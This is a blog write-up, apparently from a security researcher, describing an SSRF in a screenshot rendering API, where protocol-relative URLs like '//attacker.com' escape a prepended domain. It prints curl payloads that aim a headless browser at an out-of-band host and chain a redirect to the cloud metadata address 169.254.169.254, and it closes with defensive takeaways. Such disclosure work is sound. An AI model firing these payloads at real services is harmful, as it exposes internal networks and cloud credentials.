---
title: "The Screenshot Service That Would Render Anything"
date: 2026-07-27
draft: false
tags: ["ssrf", "cloud", "headless-browser"]
categories: ["writeup"]
summary: "A rendering API prepended its own domain to my input, which felt safe. A protocol-relative URL undid that in one line and pointed a headless Chrome instance at anything I wanted, including the cloud metadata service. A common shape for SSRF in any screenshot or render service."
ShowToc: true
TocOpen: false
---

## TL;DR

A screenshot endpoint took a `target` value, glued it onto its own domain, and rendered the result in headless Chrome. The gluing looked safe. A protocol-relative URL (`//attacker.com`) overrode the host anyway, so the browser rendered whatever I pointed it at. From there I reached the cloud metadata service on the internal network. This is a common shape for SSRF in any service that screenshots or renders user-supplied pages.

## The Endpoint

A rendering service turned a page into an image:

```
POST /api/render
Content-Type: application/json

{"target":"//URI_HERE","options":{"waitFor":"body","timeout":5000}}
```

The `target` value tells it what to render. It gets passed to a headless Chrome worker, which navigates to the resulting URL and screenshots the body.

## The Bug

The server built the target URL by string concatenation:

```
https://render.example.com/ + target
```

At a glance that looks locked down. Your input is always stuck behind their domain, so how would you leave it?

Protocol-relative URLs. Passing `//attacker.com` as the target produces `https://render.example.com///attacker.com`, and when that hits `new URL()`, the `//` is read as the start of a new authority. The host becomes `attacker.com`. The prepended domain is ignored.

First test, point it at a Collaborator:

```bash
curl -s 'https://render.example.com/api/render' \
  -H 'Content-Type: application/json' \
  --data '{"target":"//YOUR_COLLAB.oastify.com/probe","options":{"waitFor":"body","timeout":5000}}' \
  -o probe.jpg
```

The Collaborator logged a GET from a cloud egress IP with a `HeadlessChrome` user agent. The browser was fetching arbitrary external hosts and handing me back their response body as an image. That is SSRF with read access to whatever renders.

## Reaching the Internal Network

External is one thing. The prize is internal.

The browser followed cross-scheme redirects, HTTPS to HTTP, which is the opening. I stood up a small redirect server and pointed the target at it. The redirect sent the browser to the cloud metadata address:

```bash
curl -s 'https://render.example.com/api/render' \
  -H 'Content-Type: application/json' \
  --data '{"target":"//REDIRECT_SERVER/redir?to=http://169.254.169.254/computeMetadata/v1/","options":{"waitFor":"body","timeout":6000}}' \
  -o metadata.jpg
```

The screenshot came back with:

```
Missing required header "Metadata-Flavor": Google
```

That response only comes from the metadata server itself. The render worker could reach `169.254.169.254`, an address that should never be touchable from user input.

## Where It Stops

Worth being straight about the ceiling. The metadata service answered, but it demands a `Metadata-Flavor: Google` header before it hands over anything useful. A browser navigation does not send that header, so this did not pull credentials on its own. What it proved:

- The response body of arbitrary external hosts could be read
- The internal cloud metadata range was reachable
- Internal HTTP services not exposed to the public could be probed

The gap between "reached metadata" and "read metadata" is a header. That is a thinner margin than anyone should be comfortable with.

## Takeaways

Prepending your own domain to user input is not a defense. A protocol-relative `//` walks right out of it, and so do a few other tricks (`@`, backslashes, and whitespace depending on the parser).

A headless browser is a confused deputy with a full network stack. If it renders user-controlled URLs, treat it as SSRF by default and lock its egress down to what it actually needs.

Cross-scheme redirect following turns a plain external SSRF into an internal one. The fetcher should not follow redirects into link-local or private ranges, full stop.
